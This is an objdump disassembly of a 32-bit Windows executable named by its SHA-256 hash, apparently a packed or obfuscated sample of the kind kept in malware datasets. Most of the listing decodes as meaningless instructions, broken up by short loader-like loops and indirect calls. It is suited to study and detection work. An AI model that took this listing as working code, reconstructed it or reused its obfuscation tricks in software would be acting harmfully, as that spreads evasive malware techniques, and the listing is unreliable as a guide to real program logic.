
164863f4479bceebaa2bce23b2a3a5238cbfa251a30e63a538ef33b5d1da4d83.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc98
  40100b:	jmp    0x4011ce
  401010:	inc    DWORD PTR ss:[esi]
  401013:	shl    BYTE PTR [edi-0x1ca60faf],1
  401019:	fs cmp eax,0x523f638c
  40101f:	cmc    
  401020:	jle    0x4010a0
  401022:	jle    0x4010a2
  401024:	cwde   
  401025:	jg     0x4010a5
  401027:	jle    0x400ff7
  401029:	xlat   BYTE PTR ds:[ebx]
  40102a:	cmp    eax,0xcfd339d5
  40102f:	ror    esi,1
  401031:	pop    es
  401032:	add    al,0x3
  401034:	bsf    eax,DWORD PTR [eax]
  401037:	rdpmc  
  401039:	xadd   BYTE PTR [eax],bl
  40103c:	(bad)  
  40103d:	adc    BYTE PTR [edi],bl
  40103f:	mov    ecx,0xddb70058
  401044:	push   cs
  401045:	out    dx,eax
  401046:	mov    ebp,0x8e03d6db
  40104b:	es mov esi,0x1541a2f4
  401051:	lods   eax,DWORD PTR ds:[esi]
  401052:	fiadd  WORD PTR [esi+0x1f]
  401055:	data16 in al,dx
  401057:	outs   dx,DWORD PTR ds:[esi]
  401058:	or     edx,DWORD PTR [ecx]
  40105a:	pushf  
  40105b:	js     0x401033
  40105d:	inc    eax
  40105e:	stos   BYTE PTR es:[edi],al
  40105f:	push   ebx
  401060:	sub    eax,0xad3cc4d1
  401065:	mov    bh,BYTE PTR [ebx-0x3b]
  401068:	stos   DWORD PTR es:[edi],eax
  401069:	push   es
  40106a:	(bad)  
  40106b:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401071:	jmp    0x4010a3
  401073:	mov    ebp,ecx
  401075:	dec    edi
  401076:	out    0xa6,al
  401078:	inc    ecx
  401079:	call   DWORD PTR [edi-0x2556f868]
  40107f:	mov    ebp,0x5536ed4d
  401084:	and    esi,DWORD PTR [edx-0x43619116]
  40108a:	jnp    0x40109d
  40108c:	ret    
  40108d:	xchg   edx,eax
  40108e:	and    esp,edx
  401090:	jmp    0x4010f0
  401092:	ret    0xb8e4
  401095:	lock jmp 0xd765:0x74cf3192
  40109d:	and    ch,cl
  40109f:	add    bl,cl
  4010a1:	adc    DWORD PTR [ecx-0x5a],edx
  4010a4:	xor    eax,0x78616f03
  4010a9:	or     BYTE PTR [ecx],dh
  4010ab:	fisttp QWORD PTR [esi+0x7f752854]
  4010b1:	(bad)
  4010b6:	or     ebx,DWORD PTR [ebx+0x55]
  4010b9:	fst    st(6)
  4010bb:	or     ebx,edx
  4010bd:	pop    esp
  4010be:	fstp   DWORD PTR [ecx]
  4010c0:	jno    0x401060
  4010c2:	inc    esi
  4010c3:	dec    ebx
  4010c4:	aaa    
  4010c5:	adc    eax,0x1a29772b
  4010ca:	sar    DWORD PTR [esi],cl
  4010cc:	dec    edi
  4010cd:	call   0x709ab59e
  4010d2:	mov    esp,0xc3d5649d
  4010d7:	mov    bh,0x74
  4010d9:	jns    0x401139
  4010db:	jge    0x40111b
  4010dd:	out    0xd4,al
  4010df:	iret   
  4010e0:	xor    eax,DWORD PTR [ecx+0x9]
  4010e3:	fsubr  DWORD PTR [eax]
  4010e5:	stos   DWORD PTR es:[edi],eax
  4010e6:	test   DWORD PTR [edi],edx
  4010e8:	jmp    0x4437a549
  4010ed:	lods   eax,DWORD PTR ds:[esi]
  4010ee:	sub    DWORD PTR [edx+0x7e],0x5866699a
  4010f5:	pusha  
  4010f6:	retf   
  4010f7:	cmp    ecx,ecx
  4010f9:	fadd   QWORD PTR [edi]
  4010fb:	pop    edi
  4010fc:	pop    es
  4010fd:	push   ebx
  4010fe:	shl    edx,1
  401100:	and    BYTE PTR [edx],ah
  401102:	mov    es,WORD PTR [ebp-0x3fdd8935]
  401108:	imul   esi,DWORD PTR [edx+0x119329cf],0x47a219d7
  401112:	je     0x4010d0
  401114:	test   eax,0x6ace96e4
  401119:	add    edx,0x2c
  40111c:	fstp   QWORD PTR [edi]
  40111e:	or     al,0x1
  401120:	data16 or al,dh
  401123:	and    edi,esi
  401125:	(bad)  
  401126:	xor    eax,0xa1f234ad
  40112b:	out    0xc5,al
  40112d:	xchg   esp,eax
  40112e:	push   esp
  40112f:	call   0xa96e54f1
  401134:	jp     0x40113a
  401136:	(bad)  
  401137:	sahf   
  401138:	icebp  
  401139:	adc    edx,eax
  40113b:	mov    dl,0x90
  40113d:	add    DWORD PTR [edx+edx*8+0x7b3f5be4],ecx
  401144:	stos   DWORD PTR es:[edi],eax
  401145:	popf   
  401146:	push   edx
  401147:	and    al,0x43
  401149:	jne    0x4011b4
  40114b:	mov    BYTE PTR [ecx-0x569adf1b],ah
  401151:	dec    edx
  401152:	xchg   BYTE PTR [esi-0x22],ah
  401155:	or     ebx,DWORD PTR [ecx+eax*4-0x1395332f]
  40115c:	push   ds
  40115d:	imul   edx,DWORD PTR [ecx+0x9],0xdeeadd7b
  401164:	in     al,dx
  401165:	cmp    eax,0xcd34345
  40116a:	add    eax,0xdc6640f2
  40116f:	adc    eax,0x940403dd
  401174:	push   es
  401175:	sub    eax,0xf886955d
  40117a:	mov    ebp,0x93d01e2f
  40117f:	cdq    
  401180:	mov    ds:0x675e3fcd,al
  401185:	fwait
  401186:	pop    ebp
  401187:	jb     0x40115e
  401189:	repnz dec al
  40118c:	clc    
  40118d:	pusha  
  40118e:	in     al,0x75
  401190:	jns    0x40120e
  401192:	lods   eax,DWORD PTR cs:[esi]
  401194:	or     BYTE PTR [ebp+ebx*4+0x2dab24d2],ch
  40119b:	or     BYTE PTR [edx],cl
  40119d:	mov    dh,0x56
  40119f:	stos   DWORD PTR es:[edi],eax
  4011a0:	sbb    ah,dh
  4011a2:	imul   esi,DWORD PTR [ebx+0x3ff250fe],0x24
  4011a9:	xor    DWORD PTR [ecx+0x5a81824],ecx
  4011af:	arpl   WORD PTR [esi*1-0x27212e13],dx
  4011b6:	mov    BYTE PTR [edi-0xed318b8],0x31
  4011bd:	cwde   
  4011be:	sub    al,0xb
  4011c0:	out    0x3d,al
  4011c2:	dec    esi
  4011c3:	push   0x3cbc1bcd
  4011c8:	dec    eax
  4011c9:	sub    bl,BYTE PTR [eax]
  4011cb:	adc    ch,dl
  4011cd:	xlat   BYTE PTR ds:[ebx]
  4011ce:	mov    DWORD PTR [ebp-0x20],eax
  4011d1:	mov    ecx,0x5d3a
  4011d6:	mov    ecx,DWORD PTR [ebp-0x20]
  4011d9:	mov    DWORD PTR [ebp-0x24],0x4ec1
  4011e0:	cmp    ecx,eax
  4011e2:	jne    0x4020c2
  4011e8:	sbb    ecx,0xfa8
  4011ee:	mov    ax,WORD PTR [ebp-0x24]
  4011f2:	and    DWORD PTR ds:0x430455,0x0
  4011fc:	mov    ecx,DWORD PTR ds:0x430455
  401202:	inc    ecx
  401203:	mov    DWORD PTR ds:0x430455,ecx
  401209:	cmp    DWORD PTR ds:0x430455,0xb
  401210:	jne    0x401248
  401216:	push   0x25a9
  40121b:	push   0x3372
  401220:	push   0x5bb7
  401225:	push   DWORD PTR [ebp-0x1c]
  401228:	push   0x6ec1
  40122d:	push   DWORD PTR [ebp-0x28]
  401230:	push   0x3d62
  401235:	push   0x5689
  40123a:	push   DWORD PTR [ebp-0x28]
  40123d:	push   0x7975
  401242:	call   DWORD PTR ds:0x42ec0b
  401248:	cmp    DWORD PTR ds:0x430455,0xa
  40124f:	jne    0x401262
  401255:	mov    ecx,DWORD PTR ds:0x430455
  40125b:	inc    ecx
  40125c:	mov    DWORD PTR ds:0x430455,ecx
  401262:	cmp    DWORD PTR ds:0x430455,0x12
  401269:	jb     0x4011fc
  40126f:	mov    DWORD PTR ds:0x43044d,0x1e
  401279:	cmp    DWORD PTR ds:0x43044d,0x0
  401280:	je     0x401471
  401286:	cmp    DWORD PTR ds:0x43044d,0x2d
  40128d:	jne    0x40129c
  401293:	push   DWORD PTR [ebp-0x20]
  401296:	call   DWORD PTR ds:0x42e9a7
  40129c:	mov    ecx,DWORD PTR ds:0x43044d
  4012a2:	dec    ecx
  4012a3:	mov    DWORD PTR ds:0x43044d,ecx
  4012a9:	jmp    0x401279
  4012ae:	jmp    0x401471
  4012b3:	out    0xe8,al
  4012b5:	sub    al,BYTE PTR [ebx]
  4012b7:	xor    cl,al
  4012b9:	imul   ecx
  4012bb:	and    BYTE PTR [ecx],bh
  4012bd:	adc    esi,DWORD PTR [ebx+0x6ae2bd00]
  4012c3:	cwde   
  4012c4:	jg     0x401344
  4012c6:	jle    0x401260
  4012c8:	jg     0x401348
  4012ca:	jle    0x401307
  4012cc:	jmp    0xde21:0x4805924b
  4012d3:	bound  eax,QWORD PTR [ecx]
  4012d5:	pop    ss
  4012d6:	leave  
  4012d7:	xor    al,0xb7
  4012d9:	dec    edx
  4012da:	sub    DWORD PTR [ebx-0x68],0x74
  4012de:	loope  0x4012f5
  4012e0:	fcmove st,st(0)
  4012e2:	push   0x7a
  4012e4:	xor    al,dl
  4012e6:	mov    bl,0x4d
  4012e8:	ins    BYTE PTR es:[edi],dx
  4012e9:	xchg   ebx,eax
  4012ea:	pop    ebp
  4012eb:	and    ebx,ebx
  4012ed:	adc    dh,bh
  4012ef:	outs   dx,BYTE PTR ds:[esi]
  4012f0:	sbb    eax,0x5d0f1661
  4012f5:	push   ebp
  4012f6:	jmp    0x10d3:0x445d3031
  4012fd:	or     al,0x1c
  4012ff:	mov    al,ds:0xe7e0cfa3
  401304:	push   eax
  401305:	push   edi
  401306:	fs push 0xffffffdc
  401309:	cmp    ebx,DWORD PTR [edi]
  40130b:	ins    BYTE PTR es:[edi],dx
  40130c:	cmp    edx,DWORD PTR [esi]
  40130e:	or     DWORD PTR [eax],0xde741669
  401314:	iret   
  401315:	imul   eax,DWORD PTR ds:0x53cd4ea3,0x406127ec
  40131f:	std    
  401320:	xor    edi,eax
  401322:	xchg   ebp,eax
  401323:	cmp    eax,DWORD PTR [esi+0x4f]
  401326:	cmp    ah,BYTE PTR [esi]
  401328:	inc    eax
  401329:	or     edi,DWORD PTR [edi-0x7df4bcfc]
  40132f:	test   eax,0x353f6c30
  401334:	lock adc BYTE PTR [eax],0x98
  401338:	popf   
  401339:	mov    cl,0xa6
  40133b:	add    BYTE PTR [ebp-0x52],cl
  40133e:	(bad)  
  40133f:	cmp    al,0x58
  401341:	cmp    DWORD PTR [edi],esi
  401343:	push   edi
  401344:	sub    eax,0x55f97d37
  401349:	inc    ebp
  40134a:	xchg   dx,ax
  40134c:	inc    ebx
  40134d:	add    al,0xae
  40134f:	jmp    0xac77161c
  401354:	std    
  401355:	pop    esi
  401356:	leave  
  401357:	stc    
  401358:	cdq    
  401359:	jns    0x4012e8
  40135b:	cdq    
  40135c:	push   esi
  40135d:	pop    ds
  40135e:	leave  
  40135f:	int    0x23
  401361:	mov    cl,al
  401363:	xchg   ebp,eax
  401364:	or     al,0xa3
  401366:	aas    
  401367:	lea    eax,[edi+eiz*2-0x64b89cc0]
  40136e:	inc    esi
  40136f:	cld    
  401370:	dec    edx
  401371:	xchg   edx,eax
  401372:	nop
  401373:	jge    0x40139f
  401375:	or     bl,cl
  401377:	retf   0x5f47
  40137a:	xlat   BYTE PTR ds:[ebx]
  40137b:	cdq    
  40137c:	add    BYTE PTR [esi+ebp*4],0xe6
  401380:	out    dx,eax
  401381:	adc    eax,0xdeea0a3c
  401386:	xor    al,0x60
  401388:	outs   dx,DWORD PTR ds:[si]
  40138a:	jns    0x40132f
  40138c:	adc    al,0x68
  40138e:	inc    ebp
  40138f:	repnz out dx,eax
  401391:	scas   al,BYTE PTR es:[edi]
  401392:	ss movs BYTE PTR es:[edi],BYTE PTR cs:[esi]
  401395:	xchg   ebx,eax
  401396:	cli    
  401397:	iret   
  401398:	jno    0x40138e
  40139a:	add    al,ch
  40139c:	sbb    BYTE PTR [ebp+ebp*4-0x2e],0x80
  4013a1:	fisub  DWORD PTR [edx-0x33]
  4013a4:	sub    al,0x13
  4013a6:	out    dx,al
  4013a7:	test   BYTE PTR [esp+ecx*8+0x3f],al
  4013ab:	out    0x14,eax
  4013ad:	enter  0x9ca1,0x5d
  4013b1:	hlt    
  4013b2:	ja     0x40140b
  4013b4:	fistp  DWORD PTR [edi+edi*1-0x12]
  4013b8:	les    esp,FWORD PTR [eax+0x23]
  4013bb:	fld    QWORD PTR [eax-0x62]
  4013be:	sbb    eax,0xfe5cd4df
  4013c3:	test   al,0xf7
  4013c5:	push   esp
  4013c6:	sahf   
  4013c7:	dec    ebx
  4013c8:	cs dec ebx
  4013ca:	xor    dl,BYTE PTR [ecx-0x7b]
  4013cd:	adc    BYTE PTR [eax-0x68278aec],ch
  4013d3:	out    dx,al
  4013d4:	mov    BYTE PTR [ebx-0x3ef9cc6c],bl
  4013da:	push   0x64
  4013dc:	mov    ch,BYTE PTR [ebp-0x6e]
  4013df:	sbb    BYTE PTR [esi+0x5022c5d3],ah
  4013e5:	jns    0x401413
  4013e7:	outs   dx,DWORD PTR ds:[esi]
  4013e8:	nop
  4013e9:	mov    al,0x80
  4013eb:	mov    edx,0x12fe8cc1
  4013f0:	mov    ds:0x24ad65e9,eax
  4013f5:	je     0x401382
  4013f7:	int3   
  4013f8:	call   0x929c6739
  4013fd:	xchg   DWORD PTR [esi],edx
  4013ff:	mov    edi,0x7185ca62
  401404:	add    eax,0xec0429c2
  401409:	sbb    BYTE PTR [edi-0x151184b7],ah
  40140f:	mov    edi,0x139ad32a
  401414:	cmp    dl,dh
  401416:	ins    BYTE PTR es:[edi],dx
  401417:	neg    BYTE PTR [ebx+0x78]
  40141a:	fcom   QWORD PTR [esi-0x563ba5c5]
  401420:	out    0x5a,al
  401422:	push   eax
  401423:	fsub   st,st(1)
  401425:	jb     0x40146e
  401427:	pop    ecx
  401428:	jae    0x4013d6
  40142a:	ins    DWORD PTR es:[edi],dx
  40142b:	popf   
  40142c:	and    ah,BYTE PTR [ebx]
  40142e:	popa   
  40142f:	jle    0x4013f9
  401431:	pop    ss
  401432:	ret    0xbc8f
  401435:	mov    edi,0x314c252a
  40143a:	xchg   esp,eax
  40143b:	xchg   edx,eax
  40143c:	(bad)
  40143f:	test   esi,0x3b433c30
  401445:	mov    esp,0x31daaea
  40144a:	mov    bh,0xfb
  40144c:	retf   
  40144d:	daa    
  40144e:	inc    edx
  40144f:	mov    eax,ds:0x70e47841
  401454:	sub    eax,0xf8db7c17
  401459:	mov    eax,0x2bafcb7c
  40145e:	lahf   
  40145f:	jns    0x401486
  401461:	push   ebp
  401462:	sbb    DWORD PTR [edi+edx*2-0x5f],eax
  401466:	leave  
  401467:	lods   al,BYTE PTR ds:[esi]
  401468:	mov    ds:0x2e153355,eax
  40146d:	sub    dh,BYTE PTR [eax]
  40146f:	ficomp DWORD PTR [eax+0x56]
  401472:	mov    ecx,0x8a3c
  401477:	adc    DWORD PTR ds:0x42eddb,0x2f3d
  401481:	xor    ax,cx
  401484:	movzx  esi,WORD PTR ds:0x430439
  40148b:	or     DWORD PTR ds:0x4304eb,esi
  401491:	mov    ecx,DWORD PTR [ebp+0x8]
  401494:	jmp    0x401657
  401499:	adc    eax,0x716ff192
  40149e:	ins    DWORD PTR es:[edi],dx
  40149f:	xchg   ecx,eax
  4014a0:	jo     0x40144d
  4014a2:	or     eax,0x7efb0fff
  4014a7:	or     eax,0x7e7dc237
  4014ac:	jle    0x401446
  4014ae:	jg     0x40152e
  4014b0:	jle    0x401462
  4014b2:	(bad)  
  4014b3:	jne    0x401502
  4014b5:	pop    edx
  4014b6:	loopne 0x40151f
  4014b8:	mov    ds:0x5bab0d00,al
  4014bd:	sub    ch,bh
  4014bf:	xchg   ebp,eax
  4014c0:	int    0xde
  4014c2:	push   ebp
  4014c3:	fucomi st,st(2)
  4014c5:	aaa    
  4014c6:	mov    ecx,0x397bc2f
  4014cb:	test   esp,0x739f22d5
  4014d1:	mov    edx,ebx
  4014d3:	mov    cl,0x90
  4014d5:	rol    DWORD PTR [eax],cl
  4014d7:	imul   BYTE PTR [edi+0x2f]
  4014da:	sub    ch,BYTE PTR ds:0x963c51d
  4014e0:	mov    dh,BYTE PTR [ebx-0x2ba35bfb]
  4014e6:	cmp    eax,0xaac6dfe4
  4014eb:	push   cs
  4014ec:	pop    es
  4014ed:	and    DWORD PTR [edi-0x6a],edi
  4014f0:	cmc    
  4014f1:	dec    esp
  4014f2:	pop    ebx
  4014f3:	js     0x40155f
  4014f5:	out    dx,al
  4014f6:	nop
  4014f7:	arpl   cx,si
  4014f9:	outs   dx,BYTE PTR ds:[esi]
  4014fa:	xlat   BYTE PTR ds:[ebx]
  4014fb:	cmc    
  4014fc:	outs   dx,DWORD PTR ds:[esi]
  4014fd:	ror    DWORD PTR [eax+0x31],cl
  401500:	xchg   ecx,eax
  401501:	mov    edx,0xd04c103
  401506:	or     dl,BYTE PTR [eax-0x6]
  401509:	push   esi
  40150a:	xchg   ebp,eax
  40150b:	sbb    al,bh
  40150d:	sahf   
  40150e:	xor    BYTE PTR [ecx+0x55],bl
  401511:	outs   dx,BYTE PTR ds:[esi]
  401512:	cmp    ebx,ebx
  401514:	fidivr WORD PTR [ebp-0x9bfb24f]
  40151a:	retf   0xb1c7
  40151d:	sbb    eax,0x6ec192f8
  401522:	ror    DWORD PTR [edx+0x2c],cl
  401525:	xor    al,BYTE PTR [esi]
  401527:	pop    ebx
  401528:	cmp    ebp,DWORD PTR [ebx]
  40152a:	sub    eax,0x950c29
  40152f:	call   0x547b:0x3d87f4db
  401536:	retf   
  401537:	or     bh,BYTE PTR [edx-0x36]
  40153a:	test   eax,0x71374dbd
  40153f:	fidiv  DWORD PTR [esi]
  401541:	cmp    BYTE PTR [ecx],0xb6
  401544:	lahf   
  401545:	push   esi
  401546:	or     BYTE PTR [ebp+ebx*8-0x60],0x19
  40154b:	ret    
  40154c:	imul   ebx,esi,0xbe1cf642
  401552:	jmp    0x5bf44934
  401557:	xchg   ebx,eax
  401558:	test   BYTE PTR [ebx*4+0x3690d807],0x2e
  401560:	daa    
  401561:	add    dl,dl
  401563:	(bad)  
  401564:	in     eax,dx
  401565:	mov    cl,0x73
  401567:	fidivr DWORD PTR [ebp-0x6c]
  40156a:	jbe    0x40158d
  40156c:	jno    0x401540
  40156e:	(bad)  [ebx-0x2210bf79]
  401574:	test   al,0xa4
  401576:	dec    ebp
  401577:	cmp    ebp,edi
  401579:	inc    edx
  40157a:	fwait
  40157b:	outs   dx,DWORD PTR ds:[esi]
  40157c:	push   ebp
  40157d:	or     ebp,ebp
  40157f:	mov    al,0x23
  401581:	fsubr  QWORD PTR [edi-0x29]
  401584:	cli    
  401585:	adc    DWORD PTR [ebx-0x6e],0xfffffff5
  401589:	xor    ebp,DWORD PTR [ecx]
  40158b:	xchg   esp,eax
  40158c:	cmp    eax,0x9274c2f4
  401591:	xlat   BYTE PTR ds:[ebx]
  401592:	push   esp
  401593:	mov    bh,0x2c
  401595:	arpl   ax,ax
  401597:	mov    DWORD PTR [ecx],ecx
  401599:	(bad)  
  40159b:	xor    ch,bh
  40159d:	js     0x401575
  40159f:	pop    esp
  4015a0:	inc    ecx
  4015a1:	js     0x401531
  4015a3:	inc    edi
  4015a4:	(bad)  
  4015a5:	pop    ebx
  4015a6:	mov    bl,0x9b
  4015a8:	xchg   ebp,eax
  4015a9:	dec    ecx
  4015aa:	sub    al,0x7
  4015ac:	mov    dh,0x60
  4015ae:	shl    BYTE PTR ds:0xe9b40efb,1
  4015b4:	stos   DWORD PTR es:[edi],eax
  4015b5:	popa   
  4015b6:	dec    edi
  4015b7:	fcomp  QWORD PTR [ebx+0x7]
  4015ba:	push   es
  4015bb:	sbb    al,0xf5
  4015bd:	lods   eax,DWORD PTR ds:[esi]
  4015be:	xchg   edi,eax
  4015bf:	adc    eax,0xf29acb0f
  4015c4:	popa   
  4015c5:	xor    edx,esi
  4015c7:	stos   DWORD PTR es:[edi],eax
  4015c8:	xchg   esp,eax
  4015c9:	lock into 
  4015cb:	lock dec ebx
  4015cd:	idiv   esi
  4015cf:	cmp    DWORD PTR [eax],edi
  4015d1:	out    0x9f,al
  4015d3:	je     0x40155c
  4015d5:	mov    eax,0x6621f1dc
  4015da:	sbb    eax,0x99bb46fe
  4015df:	enter  0x5f98,0x12
  4015e3:	add    ebx,ecx
  4015e5:	pop    ebx
  4015e6:	add    BYTE PTR [edx],0x4a
  4015e9:	iret   
  4015ea:	jnp    0x401592
  4015ec:	imul   ebp,esp,0xffffff8f
  4015ef:	ret    0x39dd
  4015f2:	rcl    bh,cl
  4015f4:	push   ebp
  4015f5:	mov    ebp,0x1ac4aa0f
  4015fa:	fiadd  WORD PTR [ebp-0x59]
  4015fd:	leave  
  4015fe:	xchg   esi,eax
  4015ff:	sub    cl,BYTE PTR [edx+0x78]
  401602:	fcomi  st,st(1)
  401604:	xor    eax,0x375d0587
  401609:	repz rcr BYTE PTR [esi],0x0
  40160d:	add    eax,0xd1f24784
  401612:	aad    0xb8
  401614:	jns    0x401627
  401616:	xchg   ecx,eax
  401617:	ds popfw 
  40161a:	jo     0x401651
  40161c:	jge    0x401685
  40161e:	out    0xa,al
  401620:	sbb    dl,BYTE PTR [edi-0x2e]
  401623:	sbb    al,0x10
  401625:	add    bl,BYTE PTR [edx-0x48c6eea]
  40162b:	cdq    
  40162c:	xor    edx,DWORD PTR [esi]
  40162e:	mov    esp,0xea914d07
  401633:	fs fwait
  401635:	jle    0x40161d
  401637:	sbb    DWORD PTR [esi],0x87829b92
  40163d:	mov    edi,es
  40163f:	push   ebp
  401640:	into   
  401641:	jns    0x4015dc
  401643:	sbb    DWORD PTR [ebx],ecx
  401645:	and    edx,DWORD PTR [ebx]
  401647:	xchg   ecx,eax
  401648:	call   0xffc21081
  40164d:	not    DWORD PTR [esi+0x5dcfe4b4]
  401653:	xor    DWORD PTR [edx+ebx*2],ecx
  401656:	imul   edx,DWORD PTR [edi+0x23],0xfffffff7
  40165a:	jmp    0x40181d
  40165f:	push   cs
  401660:	and    BYTE PTR [edi],dh
  401662:	pop    ebp
  401663:	xor    DWORD PTR [ecx+0x54],ebp
  401666:	jno    0x4016b3
  401668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401669:	cmp    BYTE PTR [edi],bl
  40166b:	sbb    DWORD PTR [ecx+0x1d],edx
  40166e:	sub    BYTE PTR [edx+edi*2+0x7e],0x7e
  401673:	cwde   
  401674:	jg     0x4016f4
  401676:	jle    0x401638
  401678:	adc    BYTE PTR [ebx+0x2d7cc28],dl
  40167e:	stc    
  40167f:	dec    ebp
  401680:	outs   dx,BYTE PTR ds:[esi]
  401681:	arpl   sp,di
  401683:	mov    bl,0x25
  401685:	mov    bh,0x10
  401687:	xchg   ebx,eax
  401688:	sbb    DWORD PTR [ebx],edx
  40168a:	mov    cl,0xbc
  40168c:	sbb    eax,0xe2bb94fa
  401691:	xor    DWORD PTR [ebx],ebp
  401693:	(bad)  
  401694:	adc    BYTE PTR [edi],bl
  401696:	lock fidiv DWORD PTR [eax-0x220c914e]
  40169d:	lock lds esi,FWORD PTR fs:[esi-0x6f223fdd]
  4016a5:	cli    
  4016a6:	add    al,0xfb
  4016a8:	enter  0x5840,0x9f
  4016ac:	sub    al,0x81
  4016ae:	jl     0x401647
  4016b0:	inc    esp
  4016b1:	xor    cl,0xd1
  4016b4:	leave  
  4016b5:	rcl    BYTE PTR [edi+edi*2+0x7c],1
  4016b9:	mov    DWORD PTR [esi],ebx
  4016bb:	pop    ebp
  4016bc:	mov    edi,0x197fede2
  4016c2:	or     esi,esi
  4016c4:	xor    dl,cl
  4016c6:	cmc    
  4016c7:	data16 fcomip st,st(6)
  4016ca:	xchg   edx,eax
  4016cb:	sahf   
  4016cc:	jb     0x40168f
  4016ce:	mov    esp,0x9a31e829
  4016d3:	cli    
  4016d4:	mov    esp,0xd810b320
  4016d9:	in     al,0x11
  4016db:	loope  0x40170e
  4016dd:	and    DWORD PTR [edx+eax*4+0x35b0c475],esi
  4016e4:	sub    BYTE PTR [esi-0x16],0x0
  4016e8:	xor    bl,BYTE PTR [esi+0x67]
  4016eb:	or     BYTE PTR [edi+0x53],al
  4016ee:	or     edx,DWORD PTR [edi]
  4016f0:	dec    ebp
  4016f1:	in     al,dx
  4016f2:	mov    dh,0x47
  4016f4:	inc    DWORD PTR [ecx]
  4016f6:	mov    esi,0x5fe765b9
  4016fb:	push   eax
  4016fc:	xchg   ebx,eax
  4016fd:	fist   DWORD PTR [ecx]
  4016ff:	push   0xdbce5d2f
  401704:	dec    edx
  401705:	or     ebp,DWORD PTR [esi-0x7b850114]
  40170b:	pop    es
  40170c:	(bad)  
  40170d:	pop    edi
  40170e:	loop   0x40177d
  401710:	mov    al,ds:0xfd05e5d4
  401715:	jp     0x401706
  401717:	adc    BYTE PTR [eax],ch
  401719:	loopne 0x4016f1
  40171b:	xchg   ebp,eax
  40171c:	or     BYTE PTR [edx],cl
  40171e:	jae    0x4016f1
  401720:	xchg   BYTE PTR [edx-0x8],dh
  401723:	push   cs
  401724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401725:	cs inc ebx
  401727:	sbb    al,0x71
  401729:	dec    ecx
  40172a:	xchg   BYTE PTR ds:0xd505066a,ch
  401730:	sti    
  401731:	movnti DWORD PTR [esi+ecx*2],edx
  401735:	cmp    eax,0x85ea084
  40173a:	pop    eax
  40173b:	add    eax,0x3b14ec86
  401740:	(bad)  
  401741:	jge    0x4016ee
  401743:	mov    bh,0xe5
  401745:	mov    DWORD PTR [ecx+0x267bb48],ebx
  40174b:	xchg   ebx,eax
  40174c:	sbb    BYTE PTR ds:0xf8ad8938,bh
  401752:	sar    BYTE PTR [eax],cl
  401754:	jnp    0x40178f
  401756:	pop    edi
  401757:	std    
  401758:	mov    al,0xbe
  40175a:	xor    DWORD PTR [eax],ebx
  40175c:	lsl    ebx,WORD PTR [eax+0x5d]
  401760:	xor    cl,dh
  401762:	popa   
  401763:	dec    edi
  401764:	xor    esi,esi
  401766:	pushf  
  401767:	pop    eax
  401768:	inc    eax
  401769:	sbb    dl,BYTE PTR [esi-0x62]
  40176c:	sub    DWORD PTR [ebx+0x25],esi
  40176f:	jnp    0x4017c6
  401771:	sbb    cl,BYTE PTR [ebx-0x4a]
  401774:	stos   DWORD PTR es:[edi],eax
  401775:	hlt    
  401776:	adc    DWORD PTR [eax+esi*2-0x21b08e92],ecx
  40177d:	dec    eax
  40177e:	sbb    eax,0xf8bd6763
  401783:	cmp    dh,BYTE PTR [eax+0x6e58a31b]
  401789:	iret   
  40178a:	xor    BYTE PTR [ebx],al
  40178c:	add    ch,BYTE PTR [edi+ecx*2+0x7942f9bb]
  401793:	add    ebx,esp
  401795:	cmc    
  401796:	push   esp
  401797:	sub    eax,0xc8fe36e3
  40179c:	mov    eax,0x29d6c8e6
  4017a1:	aaa    
  4017a2:	cmp    BYTE PTR [ebx-0x6],ch
  4017a5:	not    BYTE PTR [edx]
  4017a7:	mov    ds:0xc1f8cbce,eax
  4017ac:	pop    edx
  4017ad:	jns    0x401784
  4017af:	adc    eax,0x132fed92
  4017b4:	repz sbb al,0xcb
  4017b7:	pusha  
  4017b8:	push   edi
  4017b9:	call   0xc1f2e097
  4017be:	and    edi,DWORD PTR [edi+edi*8+0x3]
  4017c2:	jmp    0x401818
  4017c4:	mov    esp,0xac78ed46
  4017c9:	pop    ebx
  4017ca:	js     0x401834
  4017cc:	bound  eax,QWORD PTR [ecx]
  4017ce:	cdq    
  4017cf:	mov    esp,0xd68b10c2
  4017d4:	int    0x7c
  4017d6:	push   eax
  4017d7:	and    WORD PTR [eax+0x7a],bx
  4017db:	jbe    0x40176a
  4017dd:	icebp  
  4017de:	push   eax
  4017df:	xor    eax,0x39e38fb2
  4017e4:	gs test ebp,edi
  4017e7:	mov    ecx,0x90ead4b
  4017ec:	add    edi,esi
  4017ee:	inc    esp
  4017ef:	or     eax,0x1e8eaad9
  4017f4:	pop    ss
  4017f5:	dec    ebp
  4017f6:	pop    esi
  4017f7:	lods   al,BYTE PTR ds:[esi]
  4017f8:	xchg   ebx,eax
  4017f9:	or     eax,0xc7d50291
  4017fe:	mov    ebp,0xe793483
  401803:	xchg   ebx,eax
  401804:	int    0x5
  401806:	or     DWORD PTR [ecx*8+0x49288d29],ebx
  40180d:	add    eax,0x7593bc11
  401812:	div    esp
  401814:	es push ebp
  401816:	cdq    
  401817:	jmp    0xe8a0d3e8
  40181c:	stos   BYTE PTR es:[edi],al
  40181d:	mov    edi,0x3b02
  401822:	add    ax,di
  401825:	mov    DWORD PTR ds:0x430455,0x60d8
  40182f:	movzx  eax,ax
  401832:	and    DWORD PTR ds:0x430459,0x0
  40183c:	mov    esi,DWORD PTR ds:0x430459
  401842:	inc    esi
  401843:	mov    DWORD PTR ds:0x430459,esi
  401849:	cmp    DWORD PTR ds:0x430459,0x1d
  401850:	jne    0x401863
  401856:	push   0x0
  401858:	push   0x21fd
  40185d:	call   DWORD PTR ds:0x42ea93
  401863:	cmp    DWORD PTR ds:0x430459,0x10
  40186a:	jb     0x40183c
  401870:	sbb    esi,0x67dd
  401876:	not    eax
  401878:	and    eax,DWORD PTR [ecx]
  40187a:	and    DWORD PTR ds:0x4304e3,0x0
  401884:	jmp    0x401898
  401889:	xor    esi,esi
  40188b:	xor    esi,DWORD PTR ds:0x4304e3
  401891:	inc    esi
  401892:	mov    DWORD PTR ds:0x4304e3,esi
  401898:	cmp    DWORD PTR ds:0x4304e3,0x1b
  40189f:	jae    0x4018dc
  4018a5:	cmp    DWORD PTR ds:0x4304e3,0x8
  4018ac:	jne    0x4018bd
  4018b2:	push   0x780b
